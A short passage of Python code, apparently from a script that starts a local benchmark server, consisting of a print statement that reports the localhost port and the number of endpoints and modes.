     print(f"[*] Benchmark server on http://127.0.0.1:{port} "
           f"({len(routes)} endpoints, {len(MODES)} modes)")
 
